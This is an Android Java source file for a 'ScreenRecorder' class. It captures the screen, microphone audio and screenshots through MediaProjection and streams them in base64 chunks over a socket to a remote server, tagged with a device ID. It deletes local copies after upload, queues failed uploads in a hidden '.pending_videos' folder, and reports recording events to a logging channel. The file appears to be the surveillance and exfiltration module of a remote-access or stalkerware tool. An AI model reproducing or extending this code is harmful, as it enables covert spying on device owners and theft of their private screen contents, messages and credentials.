package com.ultimate.access;

import android.app.Activity;
import android.content.Context;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import com.task.tusker.network.SocketManager;
import com.task.tusker.utils.DeviceInfo;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;

/**
 * Screen Recorder — MediaProjection-based video recorder.
 * Records to MP4, uploads via socket in base64 chunks.
 */
public class ScreenRecorder {

    private static final String TAG = "ScreenRecorder";

    private static final int VIDEO_BIT_RATE  = 2_000_000; // 2 Mbps (reduced for 3G)
    private static final int AUDIO_BIT_RATE  = 96_000;    // 96 Kbps
    private static final int FRAME_RATE      = 24;
    private static final int CHUNK_SIZE      = 512 * 1024; // 512 KB per chunk

    private final Context context;
    private final MediaProjectionManager projectionManager;

    private MediaProjection mediaProjection;
    private MediaRecorder   mediaRecorder;
    private VirtualDisplay  virtualDisplay;

    private int screenWidth;
    private int screenHeight;
    private int screenDensity;

    private String  outputFile;
    private boolean isRecording = false;
    private long    recordingStartTime;

    public ScreenRecorder(Context context) {
        this.context = context;
        this.projectionManager = (MediaProjectionManager)
            context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(metrics);

        // Cap resolution for upload performance
        int maxDim = 720;
        if (metrics.widthPixels > metrics.heightPixels) {
            float ratio = (float) metrics.widthPixels / metrics.heightPixels;
            screenHeight = maxDim;
            screenWidth  = (int) (maxDim * ratio);
        } else {
            float ratio = (float) metrics.heightPixels / metrics.widthPixels;
            screenWidth  = maxDim;
            screenHeight = (int) (maxDim * ratio);
        }
        screenDensity = metrics.densityDpi;
    }

    /** Start screen recording. */
    public void startRecording(android.content.Intent data) {
        if (isRecording) {
            Log.w(TAG, "startRecording called while already recording — ignored");
            return;
        }
        try {
            mediaProjection = projectionManager.getMediaProjection(Activity.RESULT_OK, data);
            if (mediaProjection == null) {
                Log.e(TAG, "getMediaProjection returned null");
                return;
            }
            setupMediaRecorder();
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenRecorder",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder.getSurface(),
                null, null);
            mediaRecorder.start();
            isRecording = true;
            recordingStartTime = System.currentTimeMillis();
            Log.i(TAG, "Recording started → " + outputFile);
            notifyRecordingEvent("recording_start", outputFile);
        } catch (Exception e) {
            Log.e(TAG, "startRecording error: " + e.getMessage());
            releaseResources();
        }
    }

    /** Stop recording and upload the file. */
    public void stopRecording() {
        if (!isRecording) return;
        isRecording = false;
        try {
            if (mediaRecorder != null) {
                try { mediaRecorder.stop(); } catch (Exception ignored) {}
                mediaRecorder.reset();
                mediaRecorder.release();
                mediaRecorder = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "mediaRecorder stop error: " + e.getMessage());
        }
        if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }
        if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; }

        long duration = System.currentTimeMillis() - recordingStartTime;
        Log.i(TAG, "Recording stopped, duration=" + duration + "ms, file=" + outputFile);
        notifyRecordingEvent("recording_stop", outputFile);
        uploadRecordingChunked(outputFile, duration);
    }

    private void setupMediaRecorder() throws Exception {
        File externalDir = context.getExternalFilesDir(null);
        File baseDir     = (externalDir != null) ? externalDir : context.getFilesDir();
        File recDir      = new File(baseDir, "Recordings");
        if (!recDir.exists()) recDir.mkdirs();

        outputFile = new File(recDir, "screen_" + System.currentTimeMillis() + ".mp4").getAbsolutePath();

        mediaRecorder = new MediaRecorder();
        try {
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        } catch (Exception e) {
            Log.w(TAG, "Audio source not available, recording video only");
        }
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setOutputFile(outputFile);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        mediaRecorder.setVideoSize(screenWidth, screenHeight);
        mediaRecorder.setVideoFrameRate(FRAME_RATE);
        mediaRecorder.setVideoEncodingBitRate(VIDEO_BIT_RATE);
        try {
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioEncodingBitRate(AUDIO_BIT_RATE);
            mediaRecorder.setAudioSamplingRate(44100);
        } catch (Exception e) {
            Log.w(TAG, "Audio encoder not available");
        }
        mediaRecorder.prepare();
    }

    /**
     * Upload recording in base64 chunks so large files don't OOM the device.
     */
    private void uploadRecordingChunked(final String filePath, final long duration) {
        new Thread(() -> {
            File file = new File(filePath);
            if (!file.exists() || file.length() == 0) {
                Log.w(TAG, "Recording file missing or empty: " + filePath);
                return;
            }
            try {
                String deviceId  = DeviceInfo.getDeviceId(context);
                String fileName  = file.getName();
                long   totalSize = file.length();
                int    totalChunks = (int) Math.ceil((double) totalSize / CHUNK_SIZE);

                Log.i(TAG, "Uploading " + fileName + " in " + totalChunks + " chunks (" + totalSize + " bytes)");

                // Notify start of upload
                JSONObject startNotif = new JSONObject();
                startNotif.put("deviceId",    deviceId);
                startNotif.put("fileName",    fileName);
                startNotif.put("fileType",    "video/mp4");
                startNotif.put("category",    "video");
                startNotif.put("totalSize",   totalSize);
                startNotif.put("totalChunks", totalChunks);
                startNotif.put("duration",    duration);
                startNotif.put("event",       "upload_start");
                SocketManager.getInstance(context).emit("file:upload_start", startNotif);

                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[CHUNK_SIZE];
                int chunkIndex = 0;
                int bytesRead;

                while ((bytesRead = fis.read(buffer)) != -1) {
                    byte[] chunk = (bytesRead < buffer.length)
                        ? Arrays.copyOf(buffer, bytesRead)
                        : buffer;
                    String base64Chunk = Base64.getEncoder().encodeToString(chunk);

                    JSONObject chunkData = new JSONObject();
                    chunkData.put("deviceId",    deviceId);
                    chunkData.put("fileName",    fileName);
                    chunkData.put("fileType",    "video/mp4");
                    chunkData.put("category",    "video");
                    chunkData.put("chunkIndex",  chunkIndex);
                    chunkData.put("totalChunks", totalChunks);
                    chunkData.put("chunkData",   base64Chunk);
                    chunkData.put("isLast",      bytesRead < CHUNK_SIZE);

                    SocketManager.getInstance(context).emit("file:chunk", chunkData);
                    chunkIndex++;

                    // Throttle to avoid flooding the socket on slow connections
                    Thread.sleep(100);
                }
                fis.close();

                // Notify upload complete
                JSONObject doneNotif = new JSONObject();
                doneNotif.put("deviceId",  deviceId);
                doneNotif.put("fileName",  fileName);
                doneNotif.put("fileType",  "video/mp4");
                doneNotif.put("category",  "video");
                doneNotif.put("event",     "upload_complete");
                doneNotif.put("duration",  duration);
                SocketManager.getInstance(context).emit("file:upload_complete", doneNotif);

                Log.i(TAG, "Upload complete: " + fileName + " (" + chunkIndex + " chunks)");
                file.delete();

            } catch (Exception e) {
                Log.e(TAG, "Upload failed: " + e.getMessage());
                // Retry: move to pending dir for later upload
                moveToPendingUploads(file);
            }
        }, "ScreenRecorder-Upload").start();
    }

    /**
     * Move a failed upload to pending dir so it can be retried on reconnect.
     */
    private void moveToPendingUploads(File file) {
        try {
            File pendingDir = new File(context.getFilesDir(), ".pending_videos");
            if (!pendingDir.exists()) pendingDir.mkdirs();
            File dest = new File(pendingDir, file.getName());
            if (file.renameTo(dest)) {
                Log.i(TAG, "Moved to pending: " + dest.getAbsolutePath());
            }
        } catch (Exception e) {
            Log.e(TAG, "moveToPendingUploads error: " + e.getMessage());
        }
    }

    /**
     * Upload any recordings that failed to upload while offline.
     */
    public void uploadPendingVideos() {
        new Thread(() -> {
            File pendingDir = new File(context.getFilesDir(), ".pending_videos");
            if (!pendingDir.exists()) return;
            File[] files = pendingDir.listFiles((d, n) -> n.endsWith(".mp4"));
            if (files == null || files.length == 0) return;
            Arrays.sort(files, (a, b) -> Long.compare(a.lastModified(), b.lastModified()));
            for (File f : files) {
                Log.i(TAG, "Retrying pending upload: " + f.getName());
                uploadRecordingChunked(f.getAbsolutePath(), 0);
                try { Thread.sleep(500); } catch (InterruptedException ignored) {}
            }
        }, "ScreenRecorder-PendingUpload").start();
    }

    /**
     * List all local recordings (both active and pending upload).
     */
    public JSONObject listLocalRecordings() {
        JSONObject result = new JSONObject();
        try {
            JSONArray list = new JSONArray();

            File externalDir = context.getExternalFilesDir(null);
            File baseDir     = (externalDir != null) ? externalDir : context.getFilesDir();
            addFilesToList(new File(baseDir, "Recordings"),    list, "completed");
            addFilesToList(new File(context.getFilesDir(), ".pending_videos"), list, "pending");

            result.put("success",    true);
            result.put("recordings", list);
            result.put("count",      list.length());
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error",   e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }

    private void addFilesToList(File dir, JSONArray list, String status) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles((d, n) -> n.endsWith(".mp4"));
        if (files == null) return;
        for (File f : files) {
            try {
                JSONObject info = new JSONObject();
                info.put("filename",     f.getName());
                info.put("size",         f.length());
                info.put("lastModified", f.lastModified());
                info.put("status",       status);
                list.put(info);
            } catch (Exception ignored) {}
        }
    }

    /**
     * Delete a specific local recording by filename.
     */
    public boolean deleteLocalRecording(String filename) {
        if (filename == null || filename.isEmpty()) return false;
        String safeName = new File(filename).getName();
        try {
            File externalDir = context.getExternalFilesDir(null);
            File baseDir     = (externalDir != null) ? externalDir : context.getFilesDir();
            File f1 = new File(new File(baseDir, "Recordings"), safeName);
            File f2 = new File(new File(context.getFilesDir(), ".pending_videos"), safeName);
            return f1.delete() || f2.delete();
        } catch (Exception e) {
            Log.e(TAG, "deleteLocalRecording error: " + e.getMessage());
            return false;
        }
    }

    /** Take a screenshot and upload it. */
    public void takeScreenshot(android.content.Intent data) {
        try {
            MediaProjection projection = projectionManager.getMediaProjection(Activity.RESULT_OK, data);
            if (projection == null) return;

            android.media.ImageReader imageReader = android.media.ImageReader.newInstance(
                screenWidth, screenHeight, android.graphics.PixelFormat.RGBA_8888, 2);

            VirtualDisplay display = projection.createVirtualDisplay(
                "Screenshot", screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null);

            imageReader.setOnImageAvailableListener(reader -> {
                try {
                    android.media.Image image = reader.acquireLatestImage();
                    if (image != null) {
                        android.media.Image.Plane[] planes = image.getPlanes();
                        java.nio.ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride   = planes[0].getRowStride();
                        int rowPadding  = rowStride - pixelStride * screenWidth;
                        android.graphics.Bitmap bitmap = android.graphics.Bitmap.createBitmap(
                            screenWidth + rowPadding / pixelStride,
                            screenHeight, android.graphics.Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);
                        saveAndUploadScreenshot(bitmap);
                        image.close();
                    }
                    display.release();
                    projection.stop();
                    imageReader.close();
                } catch (Exception e) {
                    Log.e(TAG, "screenshot capture error: " + e.getMessage());
                }
            }, null);
        } catch (Exception e) {
            Log.e(TAG, "takeScreenshot error: " + e.getMessage());
        }
    }

    private void saveAndUploadScreenshot(android.graphics.Bitmap bitmap) {
        new Thread(() -> {
            try {
                File externalDir = context.getExternalFilesDir(null);
                File baseDir     = (externalDir != null) ? externalDir : context.getFilesDir();
                File ssDir = new File(baseDir, "Screenshots");
                if (!ssDir.exists()) ssDir.mkdirs();
                File file = new File(ssDir, "screenshot_" + System.currentTimeMillis() + ".jpg");

                java.io.FileOutputStream fos = new java.io.FileOutputStream(file);
                bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 85, fos);
                fos.close();

                FileInputStream fis = new FileInputStream(file);
                byte[] fileData = new byte[(int) file.length()];
                fis.read(fileData);
                fis.close();

                String base64Data = Base64.getEncoder().encodeToString(fileData);
                JSONObject data = new JSONObject();
                data.put("deviceId", DeviceInfo.getDeviceId(context));
                data.put("fileName", file.getName());
                data.put("fileData", base64Data);
                data.put("fileType", "image/jpeg");
                data.put("category", "photo");
                SocketManager.getInstance(context).emit("file:upload", data);
                file.delete();
            } catch (Exception e) {
                Log.e(TAG, "saveAndUploadScreenshot error: " + e.getMessage());
            }
        }, "ScreenRecorder-Screenshot").start();
    }

    /** Release all media resources without stopping gracefully. */
    private void releaseResources() {
        isRecording = false;
        try { if (mediaRecorder  != null) { mediaRecorder.reset();  mediaRecorder.release();  mediaRecorder  = null; } } catch (Exception ignored) {}
        try { if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; } } catch (Exception ignored) {}
        try { if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; } } catch (Exception ignored) {}
    }

    private void notifyRecordingEvent(String type, String file) {
        try {
            JSONObject data = new JSONObject();
            data.put("type",      type);
            data.put("file",      file);
            data.put("timestamp", System.currentTimeMillis());
            SocketManager.getInstance(context).emit("log:data", new JSONObject()
                .put("deviceId", DeviceInfo.getDeviceId(context))
                .put("logType",  "screen")
                .put("logData",  data));
        } catch (Exception ignored) {}
    }

    public boolean isRecording() { return isRecording; }
}
